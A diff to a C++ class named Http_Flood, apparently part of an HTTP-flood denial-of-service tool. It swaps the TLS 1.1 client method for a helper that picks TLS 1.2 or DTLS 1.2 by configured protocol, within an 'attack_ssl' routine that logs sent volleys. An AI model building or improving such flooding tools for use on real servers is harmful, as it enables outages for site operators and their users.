@@ -62,10 +62,9 @@ int Http_Flood::make_socket(const char *host, const char *port, int sock_type) {
 }
 
 SSL_CTX *Http_Flood::InitCTX() {
-    const SSL_METHOD *method{TLSv1_1_client_method()};
+    SSL_library_init();
+    const SSL_METHOD *method{GetMethod()};
     SSL_CTX *ctx;
-    OpenSSL_add_ssl_algorithms();
-    SSL_load_error_strings();
     ctx = SSL_CTX_new(method);
     if (ctx == nullptr){
         logger->Log("Unable to connect using ssl", Logger::Error);
@@ -187,6 +186,17 @@ void Http_Flood::attack_ssl(const int *id) {
         message = std::to_string(*id) + ": Voly Sent";
         logger->Log(&message, Logger::Info);
         pause();
+    }
+}
+
+const SSL_METHOD *Http_Flood::GetMethod() {
+    switch (conf->protocol){
+        case config::TCP:
+            return TLSv1_2_client_method();
+        case config::UDP:
+            return DTLSv1_2_client_method();
+        default:
+            return nullptr;
     }
 }
 
